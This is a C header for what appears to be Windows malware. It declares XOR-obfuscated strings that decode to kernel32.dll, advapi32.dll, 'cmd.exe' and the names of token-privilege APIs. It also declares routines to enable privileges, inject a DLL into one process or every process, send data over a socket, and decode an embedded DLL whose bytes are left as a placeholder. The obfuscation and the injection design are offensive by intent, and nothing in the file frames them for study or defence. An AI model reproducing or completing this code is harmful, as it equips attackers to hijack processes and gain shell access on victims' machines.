#pragma once	
#include <stdlib.h>
#include <Windows.h>
#include <winsock.h>
#include <TlHelp32.h>
#include <tchar.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFSIZE 4098
#define KEY 0xb7
#define DLL_KEY 0x8f
#define DLL_SUBKEY 0x2c

typedef struct _sk {
	HANDLE handle;
	SOCKET Sock;
}sk;

int init();
DWORD DataSend(sk* Psk);
void ErrorClose(SOCKET* sock);
void decodeString(unsigned char* str, int param_key);
void decodeDLL(unsigned char* binary, int length, int param_key, int param_sub_key);
BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath);
BOOL InjectAllProcess(LPCTSTR szDllPath);
int SearchDll(DWORD dwPID, LPCTSTR szDllPath);

typedef void (*PFN_SetProcName)(LPCTSTR szProcName);

unsigned char KERNELDLL[] = { 0xdc, 0xd2, 0xc5, 0xd9, 0xd2, 0xdb, 0x84, 0x85, 0x99, 0xd3, 0xdb, 0xdb, 0x00 };
unsigned char ADVAPIDLL[] = { 0xd6, 0xd3, 0xc1, 0xd6, 0xc7, 0xde, 0x84, 0x85, 0x99, 0xd3, 0xdb, 0xdb, 0x00 };

unsigned char OPENPROCESSTOKEN[] = { 0xf8, 0xc7, 0xd2, 0xd9, 0xe7, 0xc5, 0xd8, 0xd4, 0xd2, 0xc4, 0xc4, 0xe3, 0xd8, 0xdc, 0xd2, 0xd9, 0x00 };
unsigned char LOOKUPPRIVILEGEVALUEW[] = { 0xfb, 0xd8, 0xd8, 0xdc, 0xc2, 0xc7, 0xe7, 0xc5, 0xde, 0xc1, 0xde, 0xdb, 0xd2, 0xd0, 0xd2, 0xe1, 0xd6, 0xdb, 0xc2, 0xd2, 0xe0, 0x00 };
unsigned char ADJUSTTOKENPRIVILEGES[] = { 0xf6, 0xd3, 0xdd, 0xc2, 0xc4, 0xc3, 0xe3, 0xd8, 0xdc, 0xd2, 0xd9, 0xe7, 0xc5, 0xde, 0xc1, 0xde, 0xdb, 0xd2, 0xd0, 0xd2, 0xc4, 0x00 };

typedef BOOL(WINAPI* PFOPENPROCESSTOKEN)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
typedef BOOL(WINAPI* PFLOOKUPPRIVILEGEVALUEW)(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
typedef BOOL(WINAPI* PFADJUSTTOKENPRIVILEGES)(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);



PFOPENPROCESSTOKEN pOpenProcessToken = NULL;
PFLOOKUPPRIVILEGEVALUEW pLookupPrivilegeValueW = NULL;
PFADJUSTTOKENPRIVILEGES pAdjustTokenPrivileges = NULL;

unsigned char PATH[] = { 0xd4, 0xda, 0xd3, 0x99, 0xd2, 0xcf, 0xd2, 0x00 };

BYTE dllBinary[] = {
	//Dll Binary
};
